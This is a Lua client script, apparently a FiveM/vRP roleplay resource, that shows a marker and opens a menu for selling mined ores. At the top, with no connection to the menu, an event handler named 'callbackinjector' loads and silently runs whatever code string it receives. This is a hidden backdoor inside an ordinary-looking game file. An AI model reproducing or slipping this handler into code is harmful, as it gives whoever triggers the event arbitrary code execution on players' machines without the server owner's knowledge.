local Tunnel = module("vrp","lib/Tunnel")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "mouro" then
		TriggerServerEvent("minerador-vender","mouro")
	elseif data == "mferro" then
		TriggerServerEvent("minerador-vender","mferro")
	elseif data == "mbronze" then
		TriggerServerEvent("minerador-vender","mbronze")
	elseif data == "mrubi" then
		TriggerServerEvent("minerador-vender","mrubi")
	elseif data == "mesmeralda" then
		TriggerServerEvent("minerador-vender","mesmeralda")
	elseif data == "diamante" then
		TriggerServerEvent("minerador-vender","diamante")

	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local crjSleep = 500
		local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),-630.68231201172,-228.2001953125,38.057014465332,true)
		if distance <= 30 then
			DrawMarker(23,-630.68231201172,-228.2001953125,38.057014465332-0.97,0,0,0,0,0,0,1.0,1.0,0.5,128,1,210,20,0,0,0,0)
			if distance <= 1.2 then
			crjSleep = 1
				if IsControlJustPressed(0,38) then
					ToggleActionMenu()
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)